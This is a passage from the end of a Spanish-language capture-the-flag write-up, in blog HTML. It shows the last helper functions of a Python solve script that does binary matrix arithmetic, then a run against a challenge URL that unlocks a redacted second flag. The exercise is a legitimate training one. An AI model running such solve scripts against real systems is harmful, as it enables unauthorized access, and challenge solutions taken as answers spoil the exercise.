                <span class=mtk1>z_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]</span> <span class=mtk5>^=</span> <span class="mtk9 mtki">x_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>][</span><span class=mtk1>k</span><span class=mtk1>]</span> <span class=mtk5>&amp;</span> <span class="mtk9 mtki">y_mat</span><span class=mtk1>[</span><span class=mtk1>k</span><span class=mtk1>][</span><span class=mtk1>j</span><span class=mtk1>]</span>

    <span class=mtk5>return</span> <span class=mtk1>z_mat</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>add_column</span><span class=mtk1>(</span><span class="mtk9 mtki">x_mat</span><span class=mtk1>,</span> <span class="mtk9 mtki">y_vector</span><span class=mtk1>):</span>
    <span class=mtk1>z_mat</span> <span class=mtk5>=</span> <span class="mtk9 mtki">x_mat</span><span class=mtk1>.copy()</span>

    <span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk9 mtki">y_vector</span><span class=mtk1>)):</span>
        <span class=mtk1>z_mat</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>].append(</span><span class="mtk9 mtki">y_vector</span><span class=mtk1>[</span><span class=mtk1>i</span><span class=mtk1>])</span>

    <span class=mtk5>return</span> <span class=mtk1>z_mat</span>
</code></pre></div>
<p>Finalmente, si ejecutamos el <em>script</em>, obtenemos la segunda <em>flag</em>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py http://35.190.155.168/c33a5d03b6
Unlocked successfully.  Flag: ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  
</code></pre></div>
<div class="mt6 instapaper_ignoref">
</div>
</div>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>